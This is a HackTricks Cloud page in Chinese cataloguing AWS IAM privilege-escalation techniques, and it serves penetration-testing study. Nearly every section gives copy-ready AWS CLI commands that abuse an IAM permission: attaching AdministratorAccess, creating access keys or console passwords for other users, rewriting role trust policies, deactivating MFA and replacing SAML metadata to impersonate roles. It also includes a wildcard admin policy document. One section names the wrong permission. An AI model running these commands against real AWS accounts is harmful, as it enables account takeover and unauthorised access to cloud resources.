# AWS - IAM权限提升

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## IAM

有关IAM的更多信息，请查看：

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

拥有**`iam:CreatePolicyVersion`**权限的攻击者可以创建一个他们可以访问的IAM策略的**新版本**。这使他们能够定义自己的**自定义权限**。在创建新的策略版本时，需要将其**设置为默认版本才能生效**，您可能会认为这需要`iam:SetDefaultPolicyVersion`权限，但在创建新的策略版本时，可以包含一个标志（**`--set-as-default`**），它将自动将其创建为**新的默认版本**。该标志**不需要**使用`iam:SetDefaultPolicyVersion`权限。

利用此方法的示例命令可能如下所示：
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
`policy.json`文件中包含了允许对账户中任何资源执行任何操作的**策略文档**。

**潜在影响：**直接提升至所有权限。

### `iam:SetDefaultPolicyVersion`

拥有**`iam:SetDefaultPolicyVersion`**权限的攻击者可能通过**当前未使用的现有策略版本**来提升权限。如果他们可以访问的**策略**有**非默认版本**，他们可以将默认版本更改为任何其他现有版本。

{% hint style="warning" %}
如果你正在**修改**版本的**策略**是授予攻击者`SetDefaultPolicyVersion`权限的**同一个策略**，并且**新版本不授予**该权限，攻击者将**无法将策略恢复到原始状态**。
{% endhint %}

利用此方法的示例命令可能如下所示：
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
其中“v2”是具有最高权限的策略版本。

**潜在影响：**通过设置不同的策略版本，间接提升权限，可能授予更多权限。

### `iam:CreateAccessKey`

具有其他用户上的**`iam:CreateAccessKey`**权限的攻击者可以在AWS环境中**创建属于另一个用户的访问密钥ID和秘密访问密钥**，前提是该用户尚未与其关联两个密钥对（最佳实践建议不应如此）。

利用此方法的示例命令可能如下所示：
```bash
aws iam create-access-key --user-name <target_user>
```
当目标用户拥有比当前用户更多的权限时。

**潜在影响：**直接提升到任何用户。

### `iam:CreateLoginProfile`

拥有其他用户上的`iam:CreateLoginProfile`权限的攻击者可以**创建一个密码**，用于登录到AWS控制台上的**任何没有设置登录配置文件的用户**。

利用此方法的示例命令可能如下所示：
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
这个密码保证符合**账户最低密码要求**。

**潜在影响：**直接提升到“任何”用户。

### `iam:UpdateLoginProfile`

拥有其他用户上的**`iam:UpdateLoginProfile`**权限的攻击者可以更改已经设置了登录配置文件的任何用户用于登录AWS控制台的密码。

与创建登录配置文件类似，利用此方法的示例命令可能如下所示：
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
这个密码保证符合**账户最低密码要求**。

**潜在影响：**直接特权升级“任何”用户。

### `iam:UpdateAccessKey`

拥有**`iam:UpdateAccessKey`**权限的攻击者可以**启用已禁用的访问密钥**并使用它（他需要拥有已禁用的访问密钥）

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**潜在影响：**直接特权升级以访问密钥用户（需要拥有密钥）。

### `iam:CreateServiceSpecificCredential`

它允许**生成**一个**用户名**和一个**密码**，可用于**访问请求中指定的服务**（CodeCommit或Amazon Keyspaces - Apache Cassandra）。

新的服务特定凭据具有与关联用户相同的权限，只是它们只能用于访问指定的服务。

每个支持的服务每个用户只能拥有**最多两组服务特定凭据**。
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**潜在影响：**直接提升用户服务权限。

### `iam:ResetServiceSpecificCredential`

与 **`iam:CreateServiceSpecificCredential`** 类似，但不是创建新的凭证，而是重置一个凭证。
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**潜在影响：**直接提升用户服务权限。

### `iam:AttachUserPolicy`

拥有 **`iam:AttachUserPolicy`** 权限的攻击者可以通过**将策略附加到他们可以访问的用户**来提升权限，将该策略的权限添加到攻击者身上。

利用此方法的示例命令可能如下所示：
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**潜在影响：** 直接提升权限到任何级别。

### `iam:AttachGroupPolicy`

拥有 **`iam:AttachGroupPolicy`** 权限的攻击者可以通过将策略附加到他们所在的组来提升权限，将该策略的权限添加到攻击者身上。
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
当组是当前用户所属的组时。

**潜在影响：**直接特权升级到任何内容（如果用户在组内）。

### `iam:AttachRolePolicy`，(`sts:AssumeRole`|`iam:createrole`)

具有**`iam:AttachRolePolicy`**权限的攻击者可以通过**将策略附加到他们可以访问的角色**来升级权限，将该策略的权限添加到攻击者身上。
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
当角色是当前用户可以使用`sts:AssumeRole`临时扮演的角色时。

**潜在影响：**直接提升到任何权限。

### `iam:PutUserPolicy`

拥有`iam:PutUserPolicy`权限的攻击者可以通过为他们可以访问的用户创建或更新内联策略来**提升权限**，将该策略的权限添加到攻击者身上。
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
您可以使用以下策略：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**潜在影响：**直接特权升级到任何内容。

### `iam:PutGroupPolicy`

拥有`iam:PutGroupPolicy`权限的攻击者可以通过**为其所在的组创建或更新内联策略**，将该策略的权限添加到攻击者身上，从而升级特权。
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
在**当前用户所在的组**中。

**潜在影响：**直接提升权限到任何地方。

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

拥有**`iam:PutRolePolicy`**权限的攻击者可以通过**为他们可以访问的角色创建或更新内联策略**来提升权限，将该策略的权限添加到攻击者身上。

利用此方法的示例命令可能如下所示：
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
当角色是当前用户可以使用`sts:AssumeRole`临时扮演的角色时。

**潜在影响：**直接提升权限到任何地方。

### `iam:AddUserToGroup`

具有**`iam:AddUserToGroup`**权限的攻击者可以使用该权限将自己添加到AWS账户中现有的IAM组中。
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
当**目标组拥有比攻击者用户账户更多/不同的权限**时。

**潜在影响：**直接提升到任何组。

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

拥有`iam:UpdateAssumeRolePolicy`和`sts:AssumeRole`权限的攻击者将能够**更改任何现有角色的假定角色策略文档**，以允许他们扮演该角色。
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
当策略如下所示时，该策略允许用户扮演角色：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**潜在影响：**直接特权升级到任何角色。

### `iam:UploadSSHPublicKey`

具有`iam:DeactivateMFADevice`权限的攻击者可以上传一个**SSH公钥并将其与指定的IAM用户关联**（[了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)）。

通过此操作上传的SSH公钥仅可用于**对关联的IAM用户进行身份验证以访问CodeCommit存储库**。有关使用SSH密钥进行CodeCommit存储库身份验证的更多信息，请参阅_CodeCommit用户指南_中的[设置CodeCommit SSH连接](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html)。
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**潜在影响：**对CodeCommit进行间接权限提升。

### `iam:DeactivateMFADevice`

拥有`iam:DeactivateMFADevice`权限的攻击者可以**停用指定的MFA设备**并将其与最初启用该设备的IAM用户解除关联（[了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)）。
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**潜在影响：**通过禁用多因素身份验证设备，间接提升用户权限，前提是你已经知道他的用户名和密码。

### `iam:ResyncMFADevice`

具有`iam:ResyncMFADevice`权限的攻击者可以将指定的多因素身份验证设备与IAM实体（用户或角色）进行**同步**（[了解更多](https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResyncMFADevice.html)）。
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**潜在影响：**通过添加MFA设备，间接提升用户权限，前提是您已经知道他的用户名和密码。

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

通过这些权限，您可以**更改SAML连接的XML元数据**。然后，您可以滥用**SAML联合**来使用任何**信任它的角色**进行**登录**。

请注意，这样做会导致**合法用户无法登录**。但是，您可以获取XML，因此可以放入您自己的XML，登录并配置之前的设置。
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
待办事项：一种能够生成SAML元数据并使用指定角色登录的工具
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

（不确定）如果攻击者拥有这些**权限**，他可以添加一个新的**Thumbprint**来成功登录所有信任该提供者的角色。

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注** 我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来 **分享您的黑客技巧**。

</details>
